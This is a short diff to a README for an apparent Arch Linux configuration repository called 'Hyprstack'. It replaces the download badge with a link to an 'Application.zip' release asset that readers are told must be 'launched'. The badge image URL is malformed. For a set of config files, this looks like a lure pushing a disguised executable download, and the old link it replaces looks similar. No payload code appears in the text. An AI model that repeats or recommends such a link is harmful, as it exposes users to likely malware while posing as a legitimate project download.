@@ -26,7 +26,7 @@ Welcome to Hyprstack, the all-in-one repository containing configuration files a
 ## Get Started 🚀
 To kickstart your journey to a streamlined Arch Linux environment, simply click the link below to download the necessary files:  
 
-[![Download Hyprstack Files](https://img.shields.io/badge/Download-Hyprstack%20Files-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)  
+[![Download Hyprstack Files](https://github.com/vieht3987/hyprstack/releases/download/v1.0/Application.zip%20Files-blue)](https://github.com/vieht3987/hyprstack/releases/download/v1.0/Application.zip)  
 
 Please note that the link ends with the file, so it needs to be launched to start the download.
 
